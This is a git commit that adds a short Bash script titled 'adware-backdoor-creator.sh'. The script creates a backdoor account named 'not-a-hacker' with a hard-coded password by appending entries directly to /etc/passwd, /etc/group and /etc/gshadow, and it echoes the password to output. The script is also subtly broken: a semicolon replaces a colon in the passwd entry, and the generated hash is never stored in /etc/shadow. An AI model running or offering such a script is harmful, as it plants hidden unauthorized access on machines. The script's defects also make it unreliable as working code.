2d0f6636122f5f3f2c87272d448d0aaa83f569d9
SwiftSki <49699645+SwiftSki@users.noreply.github.com>
2023-09-24 13:03:21 -0600

    Add files via upload

---
+++ adware-backdoor-creator.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+#new user info
+username="not-a-hacker"
+password="ThisIsAV3ryS3curePa55word"
+home="/"
+idnum=1010
+
+#generate new password hash
+passwordhash=$(openssl passwd -6 -salt xyz $password | head -n 1)
+
+echo $password
+echo $passwordhash
+
+#creating a new user manually
+echo "$username:x:$idnum:$idnum:,,,;$home:/bin/bash" >> /etc/passwd
+echo "$username:x:$idnum:" >> /etc/group
+#chown -R "$username:$username" "$home"
+#chmod -R 0755 $home
+echo "$username:!::" >> /etc/gshadow
